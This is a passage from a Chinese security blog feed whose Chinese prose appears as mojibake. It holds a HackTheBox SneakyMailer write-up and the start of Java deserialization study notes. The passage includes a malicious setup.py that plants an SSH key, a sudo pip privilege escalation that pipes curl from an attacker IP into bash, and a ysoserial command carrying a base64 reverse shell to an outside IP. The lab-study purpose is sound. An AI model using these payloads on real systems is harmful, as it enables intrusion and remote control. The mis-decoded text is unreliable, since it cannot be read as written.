é¦–å…ˆå¾ˆå®¹æ˜“å‘ç°<code>/var/www</code>æœ‰å››ä¸ªæ–‡ä»¶å¤¹<code>dev.sneakymailer.htb</code>,<code>pypi.sneakymailer.htb</code>,<code>sneakymailer.htb</code>è·Ÿhtml.å…¶ä¸­devè·Ÿhtmlå†…å®¹ä¸€è‡´æˆ‘ä»¬ä¸ç”¨ç®¡ã€‚è¿™é‡Œ<code>pypi.sneakymailer.htb</code>å€’æ˜¯ä¸ªæŒºéš¾çˆ†å‡ºæ¥çš„å­åŸŸåã€‚é‚£ä¹ˆå…ˆåŠ åˆ°hostsé‡Œå»ã€‚å‘ç°å¯¹åº”çš„åŸæ¥å°±æ˜¯ä¹‹å‰çš„8080ç«¯å£çš„æœåŠ¡ã€‚ç½‘é¡µå†…å®¹æ˜¯ä¸ªpypiserver 1.3.2.ç„¶åæœ‰ä¸¤ä¸ªå†…å®¹éƒ½è¦å¯†ç ã€‚</p><p>çœ‹èµ·æ¥webé¡µé¢æ²¡å•¥ç”¨ã€‚ç›´æ¥å»pypiæ–‡ä»¶å¤¹ä¸‹æ‰¾å†…å®¹ã€‚å‘ç°ä¸€ä¸ª.htpasswd</p><pre><code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code></pre><p>æŸ¥çœ‹hash-exampleså‘ç°æ˜¯apache apr hash.hashcatç ´è§£ä¹‹ã€‚</p><pre><code class="bash">hashcat -m 1600  -a 0 --force  -o pass.txt hash.txt /usr/share/wordlists/rockyou.txt</code></pre><p>å¾—åˆ°<br><code>$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui</code><br>ç°åœ¨æˆ‘ä»¬å€’æ˜¯èƒ½ç”¨è¿™ç»„è´¦æˆ·ç™»å½•8080çš„pypiserverã€‚ä½†æ˜¯ä¼¼ä¹è¿˜æ˜¯æ²¡å•¥ç”¨ã€‚çœ‹æ¥æˆ‘ä»¬å¾—å»äº†è§£ä¸‹pypiserver ä½œç”¨<br><a href="https://pypi.org/project/pypiserver/#table-of-contents" target="_blank" rel="noopener">https://pypi.org/project/pypiserver/#table-of-contents</a><br>è¿™é‡Œé¢ Uploading Packages Remotely è¿™ä¸ªåŠŸèƒ½æ¯”è¾ƒå¸å¼•çœ¼çƒã€‚å‡å¦‚æˆ‘ä»¬èƒ½ä¸Šä¼ æ¶æ„packageã€‚åº”è¯¥å°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ã€‚<br>è·‘ä¸ªlinpeas.sh.çœ‹çœ‹</p><pre><code class="bash">pypi       691  0.1  0.6  36800 25764 ?        Ss   04:06   0:01 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packageslow       1098  0.1  0.5  29952 20976 ?        Ss   04:07   0:00 /home/low/venv/bin/python /opt/scripts/low/install-modules.py</code></pre><p>çœ‹èµ·æ¥lowç”¨æˆ·çš„ç¡®åœ¨æ‰§è¡Œpython modulesçš„ä¸‹è½½ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•æ„å»ºä¸€ä¸ªæ¶æ„çš„setup.pyã€‚<br>ç½‘ä¸Šæ‰¾ä¸ªdemo.å‡†å¤‡ä¸€ä¸ªå†™å…¬é’¥çš„payloadã€‚</p><pre><code class="python">import setuptoolstry:    with open(&quot;/home/low/.ssh/authorized_keys&quot;, &quot;a&quot;) as f:        f.write(&quot;&quot;&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD1J7hVPxdMEhfE1XL2OOPjgQvKZGm68ldluK8TTW70AVRKxwvfUzOCJA4vPFgrzeJ5E27UTYatqxtxIDagHHjMtmkt+FFk62Xe8qO4pDlzQEjrSiXA/Ex82KHqlnDReaRHEEcc4CmtvzBVavB4o34CeTUYEG2N7OC1RbVUZkX9ULjodiaasubHG4lo5M2wYZ+1RjPxl/wupsEmPzB/SoSUgCAMra/tsd1jxhsJ0+m45puGKgv5Zb4IeWMATdd+Ea6v7J70YUns1E7Ciutn83jRw4efId4ZNJDGCA0GYKqaYLKsj/gA+evl/6asj8TQBgD516xFp2bpdGWuzy0sef2c22E6xS9Vs/uUpwC5T8hMlvjxtFIJE57dQz6JrJdwqQk1Jf3WQUoU6NfcRTampYVdrTHAatLccghgAS8ldA0vxO7hTzSDocO6iTfDqPrfRQfk7F0/geEP7KgoWKAJvBz1RQpmTvvhWa6lbESafIjzPPfN0e2I17CPSir/ek5fZh0= root@byc404&quot;&quot;&quot;)        f.close()except Exception as e:    passsetuptools.setup(    name=&quot;byc_404&quot;,     version=&quot;0.0.1&quot;,    author=&quot;byc&quot;,    author_email=&quot;byc@bycsec.top&quot;,    description=&quot;A small example package&quot;,    long_description=&quot;&quot;,    long_description_content_type=&quot;&quot;,    url=&quot;https://github.com/pypa/sampleproject&quot;,    packages=setuptools.find_packages(),    classifiers=[    &quot;Programming Language :: Python :: 3&quot;,    &quot;License :: OSI Approved :: MIT License&quot;,    &quot;Operating System :: OS Independent&quot;,    ],)</code></pre><p>ç„¶åæ˜¯<code>~/.pypirc</code>æ–‡ä»¶ã€‚ä½¿ç”¨å®ƒæœ‰ä»¥ä¸‹ä¸¤ä¸ªä¼˜åŠ¿</p><blockquote><ol><li>It removes the need to enter a username/password when pushing to PyPI. 2. It simplifies command line usage when pushing packages to a non-default package repository (i.e. anywhere other than <a href="https://pypi.org/" target="_blank" rel="noopener">pypi.org</a>).</li></ol></blockquote><p>è¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨é‡å¤è¾“å…¥ç”¨æˆ·å¯†ç ã€‚åŒæ—¶ä¿è¯å†…å®¹æ¨å‘sneakycorp.htbæ‰€åœ¨çš„pypiä»“åº“ã€‚<br>æŒ‰ç…§å®˜ç½‘è®¾å®šä¿®æ”¹ä¸‹</p><pre><code>[distutils]index-servers = local[local]repository: http://pypi.sneakycorp.htb:8080/username: pypipassword: soufianeelhaoui</code></pre><p>å…ˆ<code>chmod 600 .pypirc</code> ç„¶åå†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥upload packageã€‚</p><pre><code class="bash">python setup.py sdist register -r local upload -r local</code></pre><p>è™½ç„¶ä¼šæç¤ºè¿™ç§æ“ä½œæ–¹æ³•å·²ç»<code>deprecated</code>äº†ã€‚ä½†æ˜¯ä¸å½±å“å®Œæˆå‘½ä»¤ã€‚<br>å½“ç„¶è¿™æ ·ä½¿ç”¨æ˜¯å› ä¸ºé¶æœºæ²¡å®‰è£…twine.ä¸è¿‡åŸºäºpypiserveræ˜¯æš´éœ²åœ¨å…¬ç½‘çš„ã€‚æˆ‘ä»¬ç›´æ¥æœ¬åœ°ä½¿ç”¨twineä¹Ÿå¯ä»¥ã€‚</p><pre><code class="bash">python3 setup.py sdist bdist_wheelpython3 -m twine upload â€“repository local dist/*</code></pre><p>å†™å…¥å…¬é’¥å³å¯sshç™»å½•<br><img src="/2020/07/16/hackthebox-SneakyMailer/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ”¶ä¸‹user.txt.</p><p>è¿™ä¸€éƒ¨åˆ†pypiserverçš„ä½¿ç”¨æŒºæœ‰æ„æ€çš„ã€‚ä¸è¿‡æˆ‘è¿™é‡Œè¯•äº†ä¸å†™å…¬é’¥ç›´æ¥å‘½ä»¤æ‰§è¡Œå€’æ˜¯æ²¡æœ‰ç”¨,æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜ï¼ˆä¹Ÿè®¸æ˜¯å› ä¸ºé¶æœºåŠ¨ä¸åŠ¨é‡å¯å§ï¼Œæ¯•ç«Ÿåˆšå‡ºçš„é¶æœºæ€»æ˜¯å®¹æ˜“å¡ï¼‰</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>è¿™ä¸€éƒ¨åˆ†å€’æ˜¯è¿‡äºç®€å•äº†ã€‚ç”±äºå‰é¢æœç´¢èµ„æ–™æ—¶æœåˆ°äº†<code>pip</code>çš„privesc.æ‰€ä»¥æ‰§è¡Œ<code>sudo -l</code>å‘ç°å¯ä»¥pip3åå°±ç®€å•äº†<br><a href="https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/</a></p><pre><code class="bash">TF=$(mktemp -d)echo &quot;import os;os.system(&#39;curl 10.10.14.87|bash&#39;)&quot; &gt; $TF/setup.pysudo pip3 install $TF</code></pre><p><img src="/2020/07/16/hackthebox-SneakyMailer/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>rooted.</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ•´ä½“ä¸Šæ¥è¯´rootä¹‹å‰çš„éƒ¨åˆ†éƒ½ç®—æ˜¯æ–°çŸ¥è¯†ã€‚é‚®ä»¶çš„éƒ¨åˆ†æŒºæœ‰æ„æ€çš„ã€‚æ„Ÿè§‰éå¸¸æ¥è¿‘çœŸå®å®æˆ˜ã€‚å‡å¦‚çœŸçš„æœ‰ç”¨æˆ·å®‰å…¨æ„è¯†ä¸å¼ºç‚¹å‡»äº†æˆ‘ä»¬çš„é“¾æ¥å°±å¯ä»¥æ‰“å¼€å¦ä¸€ç‰‡å¤©åœ°äº†ã€‚<br>åé¢pythonçš„éƒ¨åˆ†å¯èƒ½æœ‰ç‚¹æŠ€ç©·äº†ã€‚ä¸è¿‡ç¡®å®ç®—æ˜¯pythonç”¨äºææƒçš„å¸¸è§æ‰‹æ®µã€‚æ¶æ„åŒ…æˆ–è€…æ¶æ„pyæºç éƒ½å¯ä»¥å¯¼è‡´ææƒå‘ç”Ÿã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-Javaç›¸å…³</title>
      <link href="2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/"/>
      <url>2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>ä»å‡ ä¸ªæœˆå‰å°±è¯´è¦å­¦javawebã€‚ç»“æœä¸€ç›´åœ¨æ‹–ã€‚ç°åœ¨å¼€ç¯‡æ–‡ç« å¼ºè¿«è‡ªå·±å†™å†™ç¬”è®°ã€‚</p><p>å¤§ä½“ä¸Šæ‰“ç®—ä»å¸¸è§æ¼æ´å’Œæ¡†æ¶ä½¿ç”¨ä¸¤ä¸ªæ–¹é¢å­¦ä¹ ã€‚å› ä¸ºæœ‰è¯­è¨€åŸºç¡€å°±ä¸è°ˆæ¯”è¾ƒåŸºç¡€çš„éƒ¨åˆ†äº†ã€‚</p><a id="more"></a><h2 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h2><p>javaæ¯”è¾ƒå¸¸è§çš„æœ‰ç‰¹è‰²çš„æ¼æ´åŒ…æ‹¬ä½†ä¸é™äº</p><ul><li>deserialization</li><li>xxe</li><li>SpEL</li><li>ssti</li><li>url bypass<br>â€¦â€¦</li></ul><p>è¿™é‡Œç”¨JoyChouå¤§ä½¬çš„é¡¹ç›®å­¦ä¹  <a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code</a><br>éå¸¸å…¨é¢ã€‚</p><p>æ¯ç§æ¼æ´éƒ½æœ‰å¯¹åº”çš„æºç ã€‚åŸå…ˆå¾ˆå¤šååºåˆ—çš„æ´å¤ç°è¿‡ä½†æ˜¯æ²¡æœ‰çœ‹è¿‡æºç ã€‚è¿™é‡Œæ­£å¥½ç ”ç©¶ä¸‹ã€‚</p><h3 id="deserialization"><a href="#deserialization" class="headerlink" title="deserialization"></a>deserialization</h3><p>æ¶æ„åŠé˜²èŒƒæºç </p><pre><code class="Java">package org.joychou.controller;import org.joychou.config.Constants;import org.joychou.security.AntObjectInputStream;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletRequest;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.InvalidClassException;import java.io.ObjectInputStream;import java.util.Base64;import static org.springframework.web.util.WebUtils.getCookie;/** * Deserialize RCE using Commons-Collections gadget. * * @author JoyChou @2018-06-14 */@RestController@RequestMapping(&quot;/deserialize&quot;)public class Deserialize {    protected final Logger logger = LoggerFactory.getLogger(this.getClass());    /**     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64     * Add the result to rememberMe cookie.     * &lt;p&gt;     * http://localhost:8080/deserialize/rememberMe/vuln     */    @RequestMapping(&quot;/rememberMe/vuln&quot;)    public String rememberMeVul(HttpServletRequest request)            throws IOException, ClassNotFoundException {        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);        if (null == cookie) {            return &quot;No rememberMe cookie. Right?&quot;;        }        String rememberMe = cookie.getValue();        byte[] decoded = Base64.getDecoder().decode(rememberMe);        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);        ObjectInputStream in = new ObjectInputStream(bytes);        in.readObject();        in.close();        return &quot;Are u ok?&quot;;    }    /**     * Check deserialize class using black list.     * &lt;p&gt;     * http://localhost:8080/deserialize/rememberMe/security     */    @RequestMapping(&quot;/rememberMe/security&quot;)    public String rememberMeBlackClassCheck(HttpServletRequest request)            throws IOException, ClassNotFoundException {        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);        if (null == cookie) {            return &quot;No rememberMe cookie. Right?&quot;;        }        String rememberMe = cookie.getValue();        byte[] decoded = Base64.getDecoder().decode(rememberMe);        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);        try {            AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException            in.readObject();            in.close();        } catch (InvalidClassException e) {            logger.info(e.toString());            return e.toString();        }        return &quot;I&#39;m very OK.&quot;;    }}</code></pre><p>è¿™é‡Œåº”è¯¥æ˜¯æ¨¡ä»¿shiroçš„rememberMecookieååºåˆ—åŒ–.ä¸‹é¢å…ˆæ¥å›é¡¾ä¸‹javaçš„åºåˆ—åŒ–çŸ¥è¯†</p><p><a href="https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/</a></p><ul><li><p>about</p><blockquote><p>Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¯¥å­—èŠ‚åºåˆ—åŒ…æ‹¬è¯¥å¯¹è±¡çš„æ•°æ®ã€æœ‰å…³å¯¹è±¡çš„ç±»å‹çš„ä¿¡æ¯å’Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­æ•°æ®çš„ç±»å‹ã€‚å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥ï¼Œå¹¶ä¸”å¯¹å®ƒè¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€å¯¹è±¡çš„æ•°æ®ï¼Œè¿˜æœ‰å¯¹è±¡ä¸­çš„æ•°æ®ç±»å‹å¯ä»¥ç”¨æ¥åœ¨å†…å­˜ä¸­æ–°å»ºå¯¹è±¡ã€‚æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯JVMç‹¬ç«‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªå¹³å°ä¸Šåºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥åœ¨å¦ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å¹³å°ä¸Šååºåˆ—åŒ–è¯¥å¯¹è±¡ã€‚</p></blockquote></li><li><p>usage</p></li></ul><p>1.å¼¥è¡¥æ“ä½œç³»ç»Ÿçš„å·®å¼‚<br>2.å‘è¿œç¨‹å¯¹è±¡å‘é€ä¿¡æ¯æ—¶ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡åºåˆ—åŒ–æ¥ä¼ è¾“å‚æ•°å’Œè¿”å›å€¼<br>3.ä½¿ç”¨ä¸€ä¸ªBeanæ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨è®¾è®¡é˜¶æ®µå¯¹å®ƒçš„çŠ¶æ€ä¿¡æ¯è¿›è¡Œé…ç½®ï¼Œç„¶è€Œè¿™ç§çŠ¶æ€ä¿¡æ¯éœ€è¦ä¿å­˜ä¸‹æ¥ï¼Œå¹¶åœ¨ç¨‹åºå¯åŠ¨æ—¶è¿›è¡ŒåæœŸæ¢å¤ï¼Œè¿™æ—¶æ˜¯é ååºåˆ—åŒ–æœºåˆ¶æ¥å®Œæˆçš„<br>4.æ–¹ä¾¿ä¿å­˜å¯¹è±¡ä¿¡æ¯ä»¥ä¾¿äºä¸‹æ¬¡JVMå¯åŠ¨æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><ul><li>dependencies</li></ul><p>1.å®ç° java.io.Serializable å¯¹è±¡<br>2.è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç»ƒæ‰‹çš„ä¾‹å­ã€‚<br>Userç±»</p><pre><code class="java">import java.io.*;public class User implements Serializable {    public String name;    public int num;    public void info(){        System.out.println(&quot;name : &quot;+name+&quot;\nnum : &quot;+num);    }}</code></pre><p>testç±»</p><pre><code class="java">import java.io.*;public class test {    public static  void serialize_test(){        User user=new User();        user.name=&quot;byc_404&quot;;        user.num=404;        user.info();        try {            FileOutputStream f= new FileOutputStream(&quot;user.ser&quot;);            ObjectOutputStream o =new ObjectOutputStream(f);            o.writeObject(user);            o.close();            f.close();            System.out.println(&quot;[*]serialize done.&quot;);        } catch (IOException e) {            e.printStackTrace();        }    }    public static  void unserialize_test(){        User user=null;        try {            FileInputStream f= new FileInputStream(&quot;user.ser&quot;);            ObjectInputStream o =new ObjectInputStream(f);            user=(User)o.readObject();            o.close();            f.close();        } catch (IOException e) {            e.printStackTrace();        } catch (ClassNotFoundException e) {            e.printStackTrace();        }        System.out.println(&quot;[*]unserialize done.&quot;);        user.info();    }    public static void main(String[] args) {        unserialize_test();    }}</code></pre><p>é¦–å…ˆæ³¨æ„ä¸Šé¢çš„è¯­å¥ç›´æ¥è°ƒç”¨è¯»å†™æ–‡ä»¶æ—¶éƒ½éœ€è¦å®ç°trycatchã€‚è€Œreadobjectæ—¶ç‰¹æ®Šçš„æ·»åŠ äº†ä¸€ä¸ªClassNotFound çš„å¼‚å¸¸ã€‚åœ¨ideaä¸­å†™å¥½åŸä»£ç åctrl+alt+tæ·»åŠ ä¼šè‡ªåŠ¨è€ƒè™‘åˆ°è¿™äº›é—®é¢˜ï¼Œ<br>ç”Ÿæˆçš„user.serçš„æ•°æ®</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¼€å¤´AC ED è¡¨ç¤ºæ”¯æŒåºåˆ—åŒ–åè®®ã€‚00 05 åˆ™æ˜¯åºåˆ—åŒ–ç‰ˆæœ¬ã€‚è¿™æ˜¯åºåˆ—åŒ–æ•°æ®æ¯”è¾ƒæ˜¾è‘—çš„ç‰¹å¾ã€‚</p><p>ç”±äºç¼–ç¨‹ä¸­çš„é€‰æ‹©åŸå› ï¼Œæœ‰æ—¶éœ€è¦æˆ‘ä»¬å®ç°éé»˜è®¤çš„åºåˆ—åŒ–è¿‡ç¨‹ã€‚æ­¤æ—¶å¯ä»¥åœ¨å®ç°äº†Serializableæ¥å£çš„å‰æä¸‹æ·»åŠ ä¸¤ä¸ªæ–¹æ³•</p><pre><code class="java">private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException</code></pre><p><strong>åœ¨è°ƒç”¨ObjectOutputStream.writeObject()æ—¶ï¼Œä¼šæ£€æŸ¥æ‰€ä¼ é€’çš„Serializableå¯¹è±¡ï¼Œçœ‹çœ‹æ˜¯å¦å®ç°äº†è‡ªå·±çš„writeObject()ï¼Œè‹¥å®ç°äº†ï¼Œåˆ™è·³è¿‡æ­£å¸¸çš„åºåˆ—åŒ–è¿‡ç¨‹å¹¶è°ƒç”¨è‡ªå·±å®ç°çš„writeObject()ã€‚readObject()æ–¹æ³•åŒç†</strong></p><p>é‚£ä¹ˆå›åˆ°è¿œç¨‹ã€‚è¿™é‡Œç›´æ¥æ‰“ä¸€å‘å¼¹shellçš„payloadã€‚å»<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">jackson</a>ç›´æ¥è½¬æ¢ä¸‹ç¼–ç </p><pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjcuMjQ2LjIwMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}&quot; | base64</code></pre><p>è¿™ç¯å¢ƒè²Œä¼¼æ˜¯åªæœ‰cc5çš„gadgetèƒ½ç”¨.åæ¥åœ¨åŸä½œè€…é‚£çœ‹åˆ°åº”è¯¥æ˜¯å¼•å…¥äº†apache-commons-collections 3.1.jar<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>CommonCollections å®¡è®¡</li></ul><p>ä¸‹é¢æ­£å¥½æ¥å®¡è®¡ä¸‹Commons-Collectionsè¿™ä¸ªåŒ…ã€‚<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p><p>åœ¨è¿™ä¸‹å¥½jaråŒ…åæŠŠå®ƒåŠ è¿›library.å°±å¯ä»¥çœ‹æºç äº†ã€‚<br>æ¼æ´ä»£ç å‡ºç°åœ¨è¿™ä¸€éƒ¨åˆ†ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>TransformedMapç±»æ˜¯å®ç°äº†serializable,å¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapæ¥å£çš„ä¸€ä¸ªæ‰©å±•TransformedMap.decorate()æ–¹æ³•ï¼Œå¯ä»¥è·å¾—ä¸€ä¸ªTransformedMapçš„å®ä¾‹åŒ–çš„å¯¹è±¡ã€‚</p><p><code>TransformedMap.decorate()</code>æ–¹æ³•èƒ½å°†æ™®é€šçš„MapAè½¬æ¢ä¸ºTransformedMapBï¼ŒåŒæ—¶å¦‚æœ<code>TransformedMap.decorate()</code>æ–¹æ³•è®¾ç½®äº†ç¬¬äºŒä¸ªå‚æ•°keyTransformeræˆ–è€…ç¬¬ä¸‰ä¸ªå‚æ•°valueTransformerï¼Œå½“TransformedMapBè°ƒç”¨Mapçš„putæ–¹æ³•æˆ–è€…Map.Entryçš„setValueæ–¹æ³•å°±ä¼šè‡ªåŠ¨è§¦å‘åˆšæ‰è®¾ç½®çš„keyTransformeræˆ–è€…valueTransformerç›¸åº”çš„Transformer</p><p>Map.putä¸Map.Entryå…¶å®å°±æ˜¯Mapçš„ä¸¤ä¸ªæ¯”è¾ƒå¸¸è§çš„æ¥å£ã€‚å‰è€…å¯ä»¥å¾€mapä¸­è®¾ç½®ä¸€å¯¹é”®å€¼ã€‚åè€…åˆ™æ˜¯å®šä¹‰äº†getKey(),getValue()ï¼ŒsetKey(),setValue()ç­‰æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¿®æ”¹é”®å€¼ã€‚</p><blockquote><p>ç‰›é€¼çš„æ˜¯è¿™ä¸ªTransformerå¯ä»¥åˆ©ç”¨æ•°ç»„æ„é€ æˆChainedTransformerï¼ŒChainedTransformeræœ€ååˆ©ç”¨Javaçš„åå°„æœºåˆ¶å‘½ä»¤æ‰§è¡Œã€‚</p></blockquote><p>å…³äºåå°„å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªç®—æ˜¯javaéå¸¸å¸¸è§çš„å‘½ä»¤æŠ€å·§äº†ã€‚åœ¨SpELè·ŸSpring çš„sstiä¸­ç»å¸¸è§åˆ°ã€‚ä¸»è¦ç›®çš„å°±æ˜¯ç»•è¿‡æ²™ç›’ã€‚å½“ç„¶å¦‚phpçš„åºåˆ—åŒ–ä¸­ä¹Ÿæ›¾ç»é‡åˆ°è¿‡.è¿™ç®—æ˜¯JavaåŠ¨æ€ç‰¹æ€§çš„ä½“ç°ã€‚</p><p>ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„åå°„payload</p><pre><code class="java">import java.lang.reflect.Method;public class reflect {    public static void main(String[] args) throws Exception {        Object input = Runtime.class;        Class cls = input.getClass();        Method method = cls.getMethod(&quot;getMethod&quot;, new Class[] { String.class, Class[].class });        input = method.invoke(input, new Object[] { &quot;getRuntime&quot;, new Class[0] });        // æ­¤æ—¶clsä¸ºMethodï¼Œå¯¹åº”getRuntimeæ–¹æ³•ï¼Œè·å–invokeæ–¹æ³•å¹¶æ‰§è¡Œ        cls = input.getClass();        method = cls.getMethod(&quot;invoke&quot;, new Class[] { Object.class, Object[].class });        input = method.invoke(input, new Object[] { null, new Object[0] });        // æ­¤æ—¶clsä¸ºRuntimeï¼Œå¯¹åº”Runtime.getRuntime()çš„ç»“æœï¼Œå¯è°ƒç”¨execæ–¹æ³•        cls = input.getClass();        method = cls.getMethod(&quot;exec&quot;, new Class[] { String.class });        input = method.invoke(input, new Object[] { &quot;calc&quot; });    